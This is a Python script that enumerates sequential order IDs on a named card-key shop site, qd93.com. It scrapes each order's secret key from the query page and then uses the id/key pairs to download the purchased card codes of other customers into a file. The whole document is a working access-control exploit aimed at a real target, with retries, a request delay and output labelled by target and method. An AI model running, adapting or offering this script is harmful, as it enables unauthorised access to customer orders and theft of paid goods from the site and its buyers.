#!/usr/bin/env python3
"""qd93 order-id sweep: mod=query&data={order_id} -> mod=faka."""
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://qd93.com/"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/qd93_export"
MAX_ID = int(sys.argv[2]) if len(sys.argv) > 2 else 550
DELAY = float(sys.argv[3]) if len(sys.argv) > 3 else 0.8

SHOW = re.compile(r"showOrder\((\d+),'([a-f0-9]{32})'")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)


def sess():
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": "Mozilla/5.0", "Referer": BASE})
    for i in range(6):
        try:
            r = s.get(BASE, timeout=25)
            if len(r.text) > 5000:
                return s
        except Exception:
            time.sleep(5 + i * 10)
    raise RuntimeError("home fail")


def pairs_from(html):
    p = {}
    for m in SHOW.finditer(html):
        p[m.group(1)] = m.group(2)
    for m in FAKA.finditer(html):
        p[m.group(1)] = m.group(2)
    return p


def main():
    os.makedirs(OUT, exist_ok=True)
    pairs = {}
    cards = {}
    if os.path.exists(f"{OUT}/pairs.json"):
        pairs = json.load(open(f"{OUT}/pairs.json"))
    if os.path.exists(f"{OUT}/cards.json"):
        cards = json.load(open(f"{OUT}/cards.json"))

    s = sess()
    gc = s.get(BASE + "ajax.php?act=getcount", timeout=15).json()
    max_id = min(MAX_ID, int(gc.get("orders", MAX_ID)) + 5)
    print("sweep 1..", max_id, "existing", len(pairs), flush=True)

    for oid in range(1, max_id + 1):
        key = str(oid)
        if key in pairs:
            continue
        try:
            r = s.get(BASE, params={"mod": "query", "data": key}, timeout=18)
            new = pairs_from(r.text)
            hit = new.get(key)
            if hit:
                pairs[key] = hit
                print(f"HIT id={key} skey={hit[:16]}...", flush=True)
            elif new:
                pairs.update(new)
                print(f"extra +{len(new)} from data={key}", flush=True)
        except Exception as e:
            print(f"fail {key}: {e}", flush=True)
            time.sleep(20)
            s = sess()
        time.sleep(DELAY)
        if oid % 50 == 0:
            json.dump(pairs, open(f"{OUT}/pairs.json", "w"), indent=2)

    print("pairs total", len(pairs), flush=True)
    for oid, skey in sorted(pairs.items(), key=lambda x: int(x[0])):
        if oid in cards and cards[oid].get("card"):
            continue
        try:
            r = s.get(BASE, params={"mod": "faka", "id": oid, "skey": skey}, timeout=18)
            if "非发卡类" in r.text:
                cards[oid] = {"card": None, "status": "non-faka"}
                continue
            m = CARD.search(r.text)
            if m:
                cards[oid] = {"card": m.group(1).strip(), "status": "ok"}
                print(f"CARD {oid}: {m.group(1).strip()[:100]}", flush=True)
            else:
                cards[oid] = {"card": None, "status": "empty"}
        except Exception as e:
            cards[oid] = {"card": None, "status": str(e)}
        time.sleep(DELAY)

    lines = [c["card"] for c in cards.values() if c.get("card")]
    open(f"{OUT}/qd93_cards.txt", "w").write("\n".join(lines) + ("\n" if lines else ""))
    json.dump(pairs, open(f"{OUT}/pairs.json", "w"), indent=2)
    json.dump(cards, open(f"{OUT}/cards.json", "w"), ensure_ascii=False, indent=2)
    stats = {
        "target": "qd93.com",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "method": "order_id_sweep",
        "getcount": gc,
        "pairs": len(pairs),
        "cards_ok": len(lines),
    }
    json.dump(stats, open(f"{OUT}/STATS_sweep.json", "w"), ensure_ascii=False, indent=2)
    print("DONE", stats, flush=True)


if __name__ == "__main__":
    main()
